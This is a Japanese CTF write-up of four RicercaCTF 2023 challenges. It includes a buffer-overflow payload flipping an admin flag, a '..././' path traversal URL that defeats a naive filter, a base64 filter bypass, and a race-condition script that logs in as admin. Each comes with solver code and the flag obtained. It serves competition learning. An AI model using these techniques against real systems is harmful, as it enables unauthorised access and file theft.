---
title: "RicercaCTF2023 writeup"
date: 2023-04-22T23:42:11+09:00
tags: ["RicercaCTF", "pwn", "web", "misc"]
draft: false
cover:
  image: https://i.gyazo.com/5eb91b69a6ce479f5e18a97317fdbcbc.png
  relative: true
---

# はじめに
4/22に開催されたRicercaCTF 2023にSUSH1st[^1]として参加して、23位でした。

PwnもWebもあまり解けず悔しかった。

- 競技中に解いた問題
  - [[pwn 97] BOFSec(107 solves)](#pwn-97-bofsec)
  - [[web 95] Cat Café(113 solves)](#web-95-cat-café)
  - [[misc 200] gatekeeper(21 solves)](#misc-200-gatekeeper)
- 競技後に解いた問題
  - [[web] tinyDB](#web-tinydb-upsolve)

# 競技中に解いた問題
## [pwn 97] BOFSec
> 100%本物保証  
> authored by ptr-yudai  

### 問題概要
ユーザーの`is_admin`によってフラグがもらえたりもらえなかったりする。
```c
...
//（一部抜粋）
typedef struct {
  char name[0x100];
  int is_admin;
} auth_t;

auth_t get_auth(void) {
  auth_t user = { .is_admin = 0 };
  printf("Name: ");
  scanf("%s", user.name);
  return user;
}

int main() {
  char flag[0x100] = {};
  auth_t user = get_auth();

  if (user.is_admin) {
    puts("[+] Authentication successful.");
    FILE *fp = fopen("/flag.txt", "r");
    if (!fp) {
      puts("[!] Cannot open '/flag.txt'");
      return 1;
    }
    fread(flag, sizeof(char), sizeof(flag), fp);
    printf("Flag: %s\n", flag);
    fclose(fp);
    return 0;
  } else {
    puts("[-] Authentication failed.");
    return 1;
  }
}
...
```

### 解法
以下の`get_auth`関数の`scanf`関数の部分で、入力制限がされていないので、BOFが起きる。

```c
auth_t get_auth(void) {
  auth_t user = { .is_admin = 0 };
  printf("Name: ");
  scanf("%s", user.name);
  return user;
}
```

構造体はメモリ上で見れば、ただ並んでいるデータなので、
0x100分のバッファのすぐ隣は、`is_admin`である。
0x100文字分のバッファを埋めて`is_admin = 1`にする。
```c
typedef struct {
  char name[0x100];
  int is_admin;
} auth_t;
```

したがって、以下のようなペイロードを送ればいい。
```python
...
pld = b"A"*0x100 + b"1"
io.sendlineafter("Name: ", pld)
...
```

## [web 95] Cat Café
> どの猫が一番好きですか。  
> authored by ptr-yudai  

### 問題概要
単純なFlaskのWebアプリで、`/img?f=<なにか>`のようにファイルのパスを指定できる。
```python
import flask
import os

app = flask.Flask(__name__)

@app.route('/')
def index():
    return flask.render_template('index.html')

@app.route('/img')
def serve_image():
    filename = flask.request.args.get("f", "").replace("../", "")
    path = f'images/{filename}'
    if not os.path.isfile(path):
        return flask.abort(404)
    return flask.send_file(path)

if __name__ == '__main__':
    app.run()
```

また、Dockerfileを確認すると、フラグはホームディレクトリにあるようだ。
```dockerfile
...
WORKDIR /home/ctf
ADD ./app.py    ./
ADD ./images    ./images
ADD ./templates ./templates
ADD ./uwsgi.ini ./
ADD ./flag.txt  ./
...
```

### 解法
`serve_image`関数を確認すると、`../`が置換されている。 しかし、`..././`のようなパスを置換したあとは`../`という解釈になる。
```python
@app.route('/img')
def serve_image():
    filename = flask.request.args.get("f", "").replace("../", "")
    path = f'images/{filename}'
    if not os.path.isfile(path):
        return flask.abort(404)
    return flask.send_file(path)
```

したがって、以下のURLにアクセスすればフラグが得られる。
```none
http://cat-cafe.2023.ricercactf.com:8000/img?f=..././flag.txt
```

`"..././".relpace("../", "")`は`../`になるから、パストラバーサルのエスケープとして
意味がないという記憶があったので、すぐ解けた。

## [misc 200] gatekeeper
> base64で作ったフィルタを突破してください  
> authored by Arata  

### 問題概要
以下のようなコードがあり、`open sesame!`をbase64エンコードした`b3BlbiBzZXNhbWUh`を入力に与えて、
`flag.txt`を読みたいが、それはフィルタリングされており、バイパスする必要がある。
```python
import subprocess

def base64_decode(s: str) -> bytes:
  proc = subprocess.run(['base64', '-d'], input=s.encode(), capture_output=True)
  if proc.returncode != 0:
    return ''
  return proc.stdout

if __name__ == '__main__':
  password = input('password: ')

  if password.startswith('b3BlbiBzZXNhbWUh'):
    exit(':(')

  if base64_decode(password) == b'open sesame!':
    print(open('/flag.txt', 'r').read())
  else:
    print('Wrong')
```

### 解法
base64が無視するような文字を先頭に付けたらバイパスできるのではないかと思いついきました。
私が最初に送ったペイロードは以下のようなものです（`(space)`は` `を表している）。
```none
password: (space)b3BlbiBzZXNhbWUh
```

ただ、スペースが`invalid input`として検知されてしまい、うまく動きません。
適当な文字を先頭に入れてみたり、Unicodeのエンコードから組み立てられるか考えてみました。

時間が経ってから、元の文字列を分割し、
エンコードを連結したもののデコード結果はどうなるか？というアイデアが降ってきました。
ということで、以下のコードがソルバーです。

```python
from pwn import *

HOST = "gatekeeper.2023.ricercactf.com"
PORT = 10005

io = remote(HOST, PORT)

#open : b3Blbg==
# : IA==
#sesame! : c2VzYW1lIQ==
encoded = [base64.b64encode(x.encode('utf-8')).decode('utf-8') for x in ["open", " ", "sesame!"]]

pld = b''.join(encoded) #b3Blbg==IA==c2VzYW1lIQ==

io.sendlineafter(b"password: ", pld)
print(io.recvline())
io.interactive()
#RicSec{b4s364_c4n_c0nt41n_p4ddin6}
```

warmup問とそれ以外の難易度傾斜がキツそうと思っていて、
先にmiscのgatekeeperをやることにしました。（難易度のメタ読み失敗）

実際そんな感じだったのですが、gatekeeperに関しては
もう少し早く気づけた気がするしソースコードを真面目に読めばよかったので、悔しいです。

## [web] tinyDB (upsolve)
> それは、ちいさなちいさなユーザ管理データベースです...  
> authored by xryuseix  

### 問題概要
`/set_user`と`/get_flag`という2つのエンドポイントがあり、
`/set_user`では、登録されるユーザーの`grade`は常に`guest`に設定される。
また、ユーザーの数が10より多くなると、以下のような挙動が起きる。

- 全ユーザーを消去
- `***...***`というパスワードで`admin`を初期化
- 2~数秒後に`randStr()`でパスワードの変更

```typescript
...
type UserBodyT = Partial<AuthT>;
server.post<{ Body: UserBodyT }>("/set_user", async (request, response) => {
  const { username, password } = request.body;
  const session = request.session.sessionId;
  const userDB = getUserDB(session);

  let auth = {
    username: username ?? "admin",
    password: password ?? randStr(),
  };
  if (!userDB.has(auth)) {
    userDB.set(auth, "guest");
  }

  if (userDB.size > 10) {
    // Too many users, clear the database
    userDB.clear();
    auth.username = "admin";
    auth.password = getAdminPW();
    userDB.set(auth, "admin");
    auth.password = "*".repeat(auth.password.length);
  }

  const rollback = () => {
    const grade = userDB.get(auth);
    updateAdminPW();
    const newAdminAuth = {
      username: "admin",
      password: getAdminPW(),
    };
    userDB.delete(auth);
    userDB.set(newAdminAuth, grade ?? "guest");
  };
  setTimeout(() => {
    // Admin password will be changed due to hacking detected :(
    if (auth.username === "admin" && auth.password !== getAdminPW()) {
      rollback();
    }
  }, 2000 + 3000 * Math.random()); // no timing attack!

  const res = {
    authId: auth.username,
    authPW: auth.password,
    grade: userDB.get(auth),
  };

  response.type("application/json").send(res);
});
...
```

### 解法
`rollback()`が呼び出されてランダムなパスワードで初期化されるまでに、2~数秒の猶予があることがわかる。
つまり、2~数秒後を狙って、`***...***`というパスワードで`admin`としてログインを試みればいいです。

```typescript
  setTimeout(() => {
    // Admin password will be changed due to hacking detected :(
    if (auth.username === "admin" && auth.password !== getAdminPW()) {
      rollback();
    }
  }, 2000 + 3000 * Math.random()); // no timing attack!
```

したがって、以下のようなスクリプトを書きます。
```python
import httpx

BASE_URL = "http://tinydb.2023.ricercactf.com:8888"

s = httpx.Client()
s.get(BASE_URL)

for i in range(10):
    s.post(f"{BASE_URL}/set_user", json={
        'username': 'y'*(i+1),
        'password': 'y'*(i+1)
    })

r = s.post(f"{BASE_URL}/get_flag", json={
        'username': 'admin',
        'password': '*'*32
    })
print(r.text)
# {"flag":"great! here is your flag: RicSec{j4v45cr1p7_15_7000000000000_d1f1cul7}"}
```

この問題は50solvesくらいあったのですが、20solvesの問題は解けて50solvesの問題は解けない人たちになってました。
他のメンバーもパスワードが`***...***`になっていることには気づいてたのですが、解けませんでした。

# 最後に
他のメンバーのwriteup(Crypto):
> https://shibaken28.github.io/my-blog-4/contents/ricercactf/

数チームとのポイント差は詰まっていて、ポイント差はWeb問1, 2問で、
解けていれば順位がガラッと変わりそうだったのでとても悔しいです。
私たちにはWeb問を解く/取り組むよりはPwn/Rev/Cryptoに取り組む人しかいないので、
改善したいなと思ってます。

RicercaCTF 2023を開催してくださり、ありがとうございました！  
https://2023.ctf.ricsec.co.jp/

[^1]: 読み方：すしふぁーすと
